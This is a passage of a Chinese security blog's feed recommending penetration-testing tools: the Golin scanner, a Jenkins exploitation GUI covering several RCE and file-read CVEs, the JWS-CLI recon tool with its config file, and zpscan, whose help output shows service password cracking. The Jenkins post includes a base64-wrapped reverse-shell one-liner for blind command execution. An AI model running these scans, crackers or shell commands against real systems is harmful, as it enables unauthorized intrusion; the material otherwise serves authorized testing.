class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">golin web (通过web方式启动,仅支持等保功能)</span><br><span class="line">golin port (自动读取本地网卡IP地址段进行扫描,过滤虚拟网卡地址段)</span><br><span class="line">golin port -i 192.168.1.1/24 (扫描c段端口并扫描弱口令、xss、poc漏洞)+组建</span><br><span class="line">golin port -i 192.168.1.1/24 --ipfile ip.txt (扫描指定IP段的同时扫描ip.txt文件中的主机,默认读取ip.txt,目录下如果存在不使用--ipfile也会读取)</span><br><span class="line">golin port --fofa 'app="nps" &amp;&amp; port="8080"' (调用fofa数据进行扫描)</span><br><span class="line">golin port -i 192.168.1.1:8080 (快速扫描某一主机的特定端口)</span><br><span class="line">golin port -i http://www.test.com:18080 (扫描网站首页)</span><br><span class="line">golin port -i http://www.test.com:18080/info (扫描网站特定页)</span><br><span class="line">golin port -i 192.168.1.1/24 -c 1000 -t 10(仅扫描c段端口并设置并发数为1000,端口连接超时为10秒)</span><br><span class="line">golin port -i 192.168.1.1/24 --noping --nocrack --random(扫描c段端口但不探测存活不扫描弱口令,并且打乱主机顺序扫描)</span><br><span class="line">golin port -i 192.168.1.1/24 --noimg(不进行网站截图)</span><br><span class="line">golin port -i 192.168.1.1/24 --nopoc(扫描c段端口但禁用扫描漏洞)</span><br><span class="line">golin dirsearch -u https://tegitst.com -f 字典.txt --code 200,404 (扫描状态码为200以及404的web目录)</span><br><span class="line">golin [linux、mysql、oracle、sqlserver、redis、windows...] (按照3级等保要求核查各项安全配置生成html形式报告)</span><br><span class="line">golin update (检查是否可更新)</span><br></pre></td></tr></tbody></table></figure><h1 id="星图"><a href="#星图" class="headerlink" title="星图"></a>星图</h1><p><a href="https://starchart.cc/selinuxG/Golin"><img src="https://camo.githubusercontent.com/36080053f16386d174402f3a0a7f57a86e24abd9fa9881ce700e772a733d9c91/68747470733a2f2f7374617263686172742e63632f73656c696e7578472f476f6c696e2e737667" alt="随着时间的推移观星者"></a></p><h1 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h1><p>本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。</p><p>在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已获得足够的授权。请勿对未授权的目标进行扫描。</p><p>如果您在使用本工具的过程中存在任何非法行为，您需自行承担相应的一切后果。</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jenkins-综合漏洞利用工具</title>
      <link href="/2024/02/24/18-Jenkins%E7%BB%BC%E5%90%88%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/02/24/18-Jenkins%E7%BB%BC%E5%90%88%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="jenkins综合漏洞利用工具"><a href="#jenkins综合漏洞利用工具" class="headerlink" title="jenkins综合漏洞利用工具"></a>jenkins综合漏洞利用工具</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="jdk版本"><a href="#jdk版本" class="headerlink" title="jdk版本"></a>jdk版本</h3><p>在windows或linux使用jdk8的哪一个版本都应该可以，在macOS里需要jdk8u以上的版本，比如jdk8u321</p><p>安装jdk8</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-8-jdk</span><br></pre></td></tr></tbody></table></figure><p>kali切换jdk版本.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></tbody></table></figure><h3 id="外置有效负载"><a href="#外置有效负载" class="headerlink" title="外置有效负载"></a>外置有效负载</h3><p>从release下载windows_tools,linux_tools或macOS_tools并放在与JenkinsExploit-GUI-*-SNAPSHOT.jar相同的目录,可以或者自行压缩tools_source中的python源码文件</p><p>如果是linux或macOS的话需要对外置payload进行chmod +x 赋予权限 <a href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img.png" alt="图片.png"></a> <a href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img_1.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img_1.png" alt="img_1.png"></a></p><h3 id="dnslog配置"><a href="#dnslog配置" class="headerlink" title="dnslog配置"></a>dnslog配置</h3><p>进行dnslog设置，目前仅支持dnslog.pw和ceye.io</p><p><a href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img_3.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img_3.png" alt="img_3.png"></a> <a href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img_4.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img_4.png" alt="img_4.png"></a></p><h3 id="进行检测"><a href="#进行检测" class="headerlink" title="进行检测"></a>进行检测</h3><p><a href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/blob/master/img/img_2.png"><img src="https://github.com/TheBeastofwar/JenkinsExploit-GUI/raw/master/img/img_2.png" alt="img_2.png"></a></p><ul><li>在验证无回显命令执行的时候为了避免转义问题，推荐使用如下方式进行反弹shell和dnslog外带信息</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c {echo,Y....}|{base64,-d}|{bash,-i}</span><br></pre></td></tr></tbody></table></figure><h2 id="支持检测："><a href="#支持检测：" class="headerlink" title="支持检测："></a>支持检测：</h2><ul><li>CVE-2015-8103/CVE-2016-0788 Jenkins 反序列化远程代码执行<a href="https://github.com/Medicean/VulApps/tree/master/j/jenkins/1">https://github.com/Medicean/VulApps/tree/master/j/jenkins/1</a></li><li>CVE-2016-0792 Jenkins XStream反序列化远程代码执行<a href="https://github.com/jpiechowka/jenkins-cve-2016-0792">https://github.com/jpiechowka/jenkins-cve-2016-0792</a></li><li>CVE-2017-1000353 Jenkins-CI 远程代码执行漏洞<a href="https://github.com/vulhub/CVE-2017-1000353">https://github.com/vulhub/CVE-2017-1000353</a></li><li>CVE-2018-1000600 Jenkins GitHub SSRF+信息泄露</li><li>CVE-2018-1000861 Jenkins 绕过Groovy沙盒未授权命令执行漏洞<a href="https://github.com/orangetw/awesome-jenkins-rce-2019">https://github.com/orangetw/awesome-jenkins-rce-2019</a></li><li>CVE-2018-1999002 Jenkins 任意文件读取<a href="https://mp.weixin.qq.com/s/MOKeN1qEBonS8bOLw6LH_w">https://mp.weixin.qq.com/s/MOKeN1qEBonS8bOLw6LH_w</a></li><li>CVE-2019-1003000 Jenkins 远程代码执行<a href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</a></li><li>CVE-2019-1003005/CVE-2019-1003029 远程代码执行（脚本安全插件沙箱绕过）<a href="https://github.com/orangetw/awesome-jenkins-rce-2019">https://github.com/orangetw/awesome-jenkins-rce-2019</a></li><li>CVE-2024-23897 Jenkins CLI接口任意文件读取漏洞<a href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897">https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897</a></li></ul><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续:"></a>未完待续:</h2><ul><li><p>CVE-2016-9299 Jenkins ldap 反序列化远程代码执行，添加 poc</p></li><li><p>CVE-2017-1000353 无法检测的错误</p></li><li><p>继续尝试将外部设置的有效负载接入到java代码中</p></li><li><p>新增批量检测功能</p></li><li><h1 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h1><p><a href="https://github.com/TheBeastofwar/JenkinsExploit-GUI">https://github.com/TheBeastofwar/JenkinsExploit-GUI</a></p></li></ul><p>​<a href="https://github.com/TheBeastofwar/JenkinsExploit-GUI/releases/tag/v1.3">https://github.com/TheBeastofwar/JenkinsExploit-GUI/releases/tag/v1.3</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWS-CLI-全自动化信息收集工具</title>
      <link href="/2024/02/24/20-jws-cli-%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/02/24/20-jws-cli-%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="JWS-CLI-全自动化信息收集工具"><a href="#JWS-CLI-全自动化信息收集工具" class="headerlink" title="JWS-CLI-全自动化信息收集工具"></a>JWS-CLI-全自动化信息收集工具</h2><blockquote><p>前言：信息收集是渗透测试中最重要的一环，也是最繁琐和机械化的一环。jws-cli 是一款基于python的可拓展、可定制化的一键信息收集工具，适用于辅助测试人员在攻防演练和SRC项目场景下进行快速信息收集和资产整理。</p></blockquote><h2 id="github链接"><a href="#github链接" class="headerlink" title="github链接"></a>github链接</h2><p><a href="https://github.com/jammny/jws-cli">https://github.com/jammny/jws-cli</a></p><h3 id="工具特点评论"><a href="#工具特点评论" class="headerlink" title="工具特点评论"></a>工具特点评论</h3><ol><li>对目标资产实现一键收集：子域名收集+CDN识别+端口扫描+WEB指纹识别+C段扫描+WAF识别。</li><li>支持将企业全称（如：XX有限公司）作为收集目标，程序将自动化收集有关目标企业的相关资产。</li><li>支持通过编写配置文件来拓展DNS数据集，以增加子域名收集模块的灵活性。</li><li>调用你喜欢的第三方工具来代替程序本身的功能模块，如：使用ksubdomain代替本身的爆破模块。</li><li>不仅仅是信息收集，支持调用第三方工具对收集的资产进行漏洞扫描，例如afrog。</li><li>可视化生成收集结果页面，并积极到用户支持邮箱中。</li></ol><h3 id="一键自动化扫描"><a href="#一键自动化扫描" class="headerlink" title="一键自动化扫描"></a>一键自动化扫描</h3><ol><li>下载项目：<code>git clone https://github.com/jammny/jws-cli.git</code></li><li>安装依赖：<code>pip install -r requirements.txt</code></li><li>一键自动化扫描：<code>python jws-cli.py -t example.com --auto</code></li><li>一键自动化批量扫描：<code>python jws-cli.py -f targets.txt --auto</code></li><li>一键自动化收集目标企业资产：<code>python jws-cli.py -c "xx有限公司" --auto</code></li><li>使用帮助：<code>python jws-cli.py --help</code></li></ol><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>程序配置文件路径：<code>jws-cli/db/config.yaml</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"># 开启/关闭 调试模式</span><br><span class="line">debug_mode: False</span><br><span class="line"></span><br><span class="line"># 开启/关闭 数据表格展示</span><br><span class="line">show_table: True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 配置程序需要调用的api接口信息 #</span><br><span class="line">api_key:</span><br><span class="line">  # 零零信安 https://0.zone/</span><br><span class="line">  zero_key: ""</span><br><span class="line">  zero_size: 200</span><br><span class="line"></span><br><span class="line">  # quake https://quake.360.net/quake/#/index</span><br><span class="line">  quake_key: ""</span><br><span class="line">  quake_size: 200</span><br><span class="line"></span><br><span class="line">  # zoomeye https://www.zoomeye.org/</span><br><span class="line">  zoomeye_mail: ""  # zoomeye账号</span><br><span class="line">  zoomeye_pass: ""      # zoomeye密码</span><br><span class="line">  zoomeye_size: 200   # 最大检索量</span><br><span class="line"></span><br><span class="line">  # hunter https://hunter.qianxin.com/</span><br><span class="line">  hunter_key: ""</span><br><span class="line">  hunter_size: 200  # 最大检索量</span><br><span class="line"></span><br><span class="line">  # fofa https://fofa.info/</span><br><span class="line">  fofa_email: ""</span><br><span class="line">  fofa_key: ""</span><br><span class="line">  fofa_size: 200   # 最大检索量</span><br><span class="line"></span><br><span class="line">  # securitytrails https://securitytrails.com/</span><br><span class="line">  securitytrails_key: ""</span><br><span class="line"></span><br><span class="line">  # fullhunt https://fullhunt.io/search</span><br><span class="line">  fullhunt_key: ""</span><br><span class="line"></span><br><span class="line">  # binaryedge https://binaryedge.io/</span><br><span class="line">  binaryedge_key: ""</span><br><span class="line"></span><br><span class="line">  # censys https://search.censys.io/</span><br><span class="line">  censys_id: ""</span><br><span class="line">  censys_secret: ""</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 自动化扫描配置 #</span><br><span class="line"># 默认情况下，程序自动进行子域名收集和存活资产探测任务。你也可以根据自己的需求，自由搭配需要开启的扫描模块。</span><br><span class="line">auto_setting:</span><br><span class="line">  port_scan: True  # 开启/关闭 主机端口扫描。</span><br><span class="line">  cidr_scan: True  # 开启/关闭 C段资产扫描。</span><br><span class="line">  poc_scan: True   # 开启/关闭 POC漏洞扫描。</span><br><span class="line"></span><br><span class="line">  # 开启/关闭 智能模式。</span><br><span class="line">  # 智能模式下，会减少开销。仅对没有waf的url进行POC扫描。</span><br><span class="line">  smart_mode: True</span><br><span class="line"></span><br><span class="line">  # 支持通过定制化黑名单列表排除没有意义的C段资产，仅当 cidr_scan = True 时有效，列表中的值对应IP解析后的地址信息</span><br><span class="line">  filter_blacklist: [</span><br><span class="line">      '微软', '阿里云', '阿里云BGP节点', '阿里云BGP服务器', '阿里巴巴', 'Microsoft', 'CDN', 'Azure', '华为', '华为云',</span><br><span class="line">      '腾讯云', '网宿', 'Amazon', '运营商','世纪互联BGP数据中心', '内部网', '局域网', '对方和您在同一内部网', '亚马逊', '127.0.0.1'</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  # 开启/关闭 生成扫描报告</span><br><span class="line">  generate_report: True</span><br><span class="line"></span><br><span class="line">  # 邮箱信息配置</span><br><span class="line">  smtp_server: smtp.163.com         # smtp 邮箱服务器</span><br><span class="line">  smtp_port: 465                    # smtp 端口号</span><br><span class="line">  send_email: ""   # 发件人邮箱账号</span><br><span class="line">  send_pass: ""     # 发件人邮箱授权码</span><br><span class="line">  rec_email: ""     # 收件人邮箱, 如果有多个收件人需要使用英文逗号隔开</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 子域名扫描配置 #</span><br><span class="line"># 默认情况下，程序自动进行被动子域名信息收集，支持使用域名置换技术生成fuzz字典，支持额外调用ksubdomain来完成域名遍历任务。</span><br><span class="line">sub_scan:</span><br><span class="line">  # 爆破模式参数。</span><br><span class="line">  brute_engine: "ksubdomain"   # 可选参数：system 和 ksubdomain。</span><br><span class="line">  brute_fuzzy: False     # 开启/关闭 域名置换技术。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 端口扫描配置 #</span><br><span class="line"># 默认情况下，程序会对主机进行存活探测，并对存活的端口进行指纹识别。支持调用nimscan完成端口扫描任务，支持自定义要扫描的端口范围。</span><br><span class="line">port_scan:</span><br><span class="line">  engine: "nimscan"   # 可选参数：system 和 nimscan。</span><br><span class="line">  banner_status: True # 开启/关闭 指纹识别。</span><br><span class="line">  port_range: '21,22,23,80-99,135,139,442-445,666,800,801,808,880,888,889,1000-2379,3000-10010,11115,12018,12443,14000,16080,18000-18098,19001,19080,20000,20720,21000,21501,21502,28018,20880,27017'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># C段扫描配置 #</span><br><span class="line"># 支持统计目标C段中，资产IP出现的次数；支持使用 occurrence_limit 参数跳过不符合条件的C段。</span><br><span class="line">cidr_scan:</span><br><span class="line">  engine: "system"    # 可选参数：system 和 fofa</span><br><span class="line">  occurrence_limit: 3   # 如果相同C段统计IP出现次数，次数&gt;=3才扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># POC扫描配置 #</span><br><span class="line"># 支持调用afrog完成扫描任务。</span><br><span class="line">poc_scan:</span><br><span class="line">  engine: "afrog"   # 可选参数：afrog</span><br></pre></td></tr></tbody></table></figure><h3 id="添加日志"><a href="#添加日志" class="headerlink" title="添加日志"></a>添加日志</h3><table><thead><tr><th>更新时间（版本）</th><th>更新内容</th><th>备注</th></tr></thead><tbody><tr><td>2023.9.14(v0.2.1)</td><td>已知bug修复。</td><td>有问题联系我</td></tr><tr><td>2023.9.11(v0.2.0)</td><td>重写了一些模块，增加了一些功能。</td><td>有问题联系我</td></tr><tr><td>2023年5月29日(v0.1.0)</td><td>优化端口泛滥、域名泛滥处理逻辑。</td><td>有问题联系我</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zpscan-综合性强又好用的信息收集工具</title>
      <link href="/2024/02/24/33-zpscan-%E7%BB%BC%E5%90%88%E6%80%A7%E5%BC%BA%E5%8F%88%E5%A5%BD%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/02/24/33-zpscan-%E7%BB%BC%E5%90%88%E6%80%A7%E5%BC%BA%E5%8F%88%E5%A5%BD%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="zpscan-综合性很强又很好用的信息收集工具"><a href="#zpscan-综合性很强又很好用的信息收集工具" class="headerlink" title="zpscan-综合性很强又很好用的信息收集工具!"></a>zpscan-综合性很强又很好用的信息收集工具!</h1><h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><p><a href="https://github.com/niudaii/zpscan">https://github.com/niudaii/zpscan</a></p><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接:"></a>下载链接:</h2><p><a href="https://github.com/niudaii/zpscan/releases/tag/v1.8.39">https://github.com/niudaii/zpscan/releases/tag/v1.8.39</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​该工具集成domainscan、webscan、ipscan、crack、dirscan、pocscan、expscan直接一键启动开启信息收集省去了其他步骤。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>domainscan<ul><li>调用 subfinder 被动收集，调用 ksubdoamin 进行 dns 验证</li><li>泛解析、CDN 判断</li><li>获取 domain 相关的 web（host:port）资产，使用 webscan 扫描</li></ul></li><li>webscan<ul><li>支持 http/https scheme 自动判断</li><li>获取 statusCode、contentLength、favicon、iconHash、title、wappalyzer、finger</li><li>title 自动中文解码</li><li>js 静态分析跳转</li><li>favicon 自动分析获取 iconhash</li><li>指纹自定义 tags 用来过滤和标记，pocTags 与 pocscan 对应</li><li>联动模块（webscan -&gt; pocscan）</li></ul></li><li>ipscan<ul><li>支持多种输入格式（192.168.1.1-128）（192.168.1.0/24）</li><li>先端口开放扫描（tcp），使用 nmap 指纹识别协议</li><li>获取地理位置</li><li>操作系统识别</li><li>联动模块（ipscan -&gt; webscan -&gt; crack）</li></ul></li><li>crack<ul><li>支持默认端口协议和自定义协议爆破（127.0.0.1:3306）（127.0.01:3307|mysql）</li><li>支持常见服务口令爆破、未授权检测（ ftp,ssh,wmi,wmihash,smb,mssql,oracle,mysql,rdp,postgres,redis,memcached,mongodb)</li><li>全部模块测试用例（爆破成功、失败、超时）</li></ul></li><li>dirscan<ul><li>字典分类</li><li>结果过滤（重复 contentLength 判断）</li></ul></li><li>pocscan<ul><li>支持多种 poc 格式（goby、xray、nuclei）</li><li>支持指定 tag 加载 poc</li></ul></li><li>expscan<ul><li>基于 nuclei 的 exp 框架，通过 variables 替换 payload，通过 extractors 匹配结果</li></ul></li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">➜  zpscan git:(main) ./zpscan -h</span><br><span class="line">一个有点好用的信息收集工具 by zp857</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  zpscan [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  crack       常见服务弱口令爆破</span><br><span class="line">  dirscan     目录扫描</span><br><span class="line">  domainscan  子域名收集</span><br><span class="line">  help        Help about any command</span><br><span class="line">  ipscan      端口扫描</span><br><span class="line"> pocscan     poc扫描</span><br><span class="line">  webscan     web信息收集</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --debug               show debug output</span><br><span class="line">  -h, --help                help for zpscan</span><br><span class="line">  -i, --input string        single input(example: -i 'xxx')</span><br><span class="line">  -f, --input-file string   inputs file(example: -f 'xxx.txt')</span><br><span class="line">      --no-color            disable colors in output</span><br><span class="line">  -o, --output string       output file to write found results (default "result.txt")</span><br><span class="line"></span><br><span class="line">Use "zpscan [command] --help" for more information about a command.</span><br></pre></td></tr></tbody></table></figure><p>子命令（domainscan|ipscan|webscan|crack|dirscan|pocscan）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  zpscan git:(main) ./zpscan crack -h                       </span><br><span class="line">常见服务弱口令爆破,支持ftp,ssh,wmi,wmihash,smb,mssql,oracle,mysql,rdp,postgres,redis,memcached,mongodb</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  zpscan crack [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --crack-all          crack all user:pass</span><br><span class="line">      --delay int          delay between requests in seconds (0 to disable)</span><br><span class="line">  -h, --help               help for crack</span><br><span class="line">  -m, --module string      choose one module to crack(ftp,ssh,wmi,mssql,oracle,mysql,rdp,postgres,redis,memcached,mongodb) (default "all")</span><br><span class="line">      --pass string        pass(example: --pass 'admin,root')</span><br><span class="line">      --pass-file string   pass file(example: --pass-file 'pass.txt')</span><br><span class="line">      --threads int        number of threads (default 1)</span><br><span class="line">      --timeout int        timeout in seconds (default 10)</span><br><span class="line">      --user string        user(example: --user 'admin,root')</span><br><span class="line">      --user-file string   user file(example: --user-file 'user.txt')</span><br><span class="line"></span><br><span class="line">Global Flags:</span><br><span class="line">      --debug               show debug output</span><br><span class="line">  -i, --input string        single input(example: -i 'xxx')</span><br><span class="line">  -f, --input-file string   inputs file(example: -f 'xxx.txt')</span><br><span class="line">      --no-color            disable colors in output</span><br><span class="line">  -o, --output string       output file to write found results (default "result.txt")</span><br><span class="line">[INF] 运行时间: 545.655µs</span><br></pre></td></tr></tbody></table></figure><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p>domainscan</p><p><a href="https://camo.githubusercontent.com/967a9257bf972e52a373a3af67cca0d727d541f56d5b9968891abb2aca4b655b/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130303932383732322e706e67"><img src="https://camo.githubusercontent.com/967a9257bf972e52a373a3af67cca0d727d541f56d5b9968891abb2aca4b655b/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130303932383732322e706e67" alt="image-20220920100928722"></a></p><p>ipscan</p><p><a href="https://camo.githubusercontent.com/949d8fc9c82cebc92c427810a0a8da3559a066af6ed7fed13b6bbd5a8200d88d/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130313132323931392e706e67"><img src="https://camo.githubusercontent.com/949d8fc9c82cebc92c427810a0a8da3559a066af6ed7fed13b6bbd5a8200d88d/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130313132323931392e706e67" alt="image-20220920101122919"></a></p><p>webscan</p><p><a href="https://camo.githubusercontent.com/3330122f0616cfde8541bf1438750a8572cc4628758125cac69de1530c5fb4fb/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303931363133343333303537352e706e67"><img src="https://camo.githubusercontent.com/3330122f0616cfde8541bf1438750a8572cc4628758125cac69de1530c5fb4fb/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303931363133343333303537352e706e67" alt="image-20220916134330575"></a></p><p>crack</p><p><a href="https://camo.githubusercontent.com/782b30fa2f2109770980e157259bc1143c569f44db6e60d47f5e15d7354572c2/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303931363133343433333930382e706e67"><img src="https://camo.githubusercontent.com/782b30fa2f2109770980e157259bc1143c569f44db6e60d47f5e15d7354572c2/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303931363133343433333930382e706e67" alt="image-20220916134433908"></a></p><p>dirscan</p><p><a href="https://camo.githubusercontent.com/6ca9a82ebf9d4ef6a509a155faac77371e70a05700a48dc487ddb3e33dbb7f15/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130313330383434392e706e67"><img src="https://camo.githubusercontent.com/6ca9a82ebf9d4ef6a509a155faac77371e70a05700a48dc487ddb3e33dbb7f15/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303232303932303130313330383434392e706e67" alt="image-20220920101308449"></a></p><p>pocscan</p><p><a href="https://camo.githubusercontent.com/3ececd4fedfa45ff4fb83ac3da263d4f274e1c918721150138a6de68a2c187c6/68747470733a2f2f6e6e6f7465732e6f73732d636e2d68616e677a686f752e616c6979756e63732e636f6d2f6e6f7465732f696d6167652d32303233303432323139323033333737382e706e67"><img 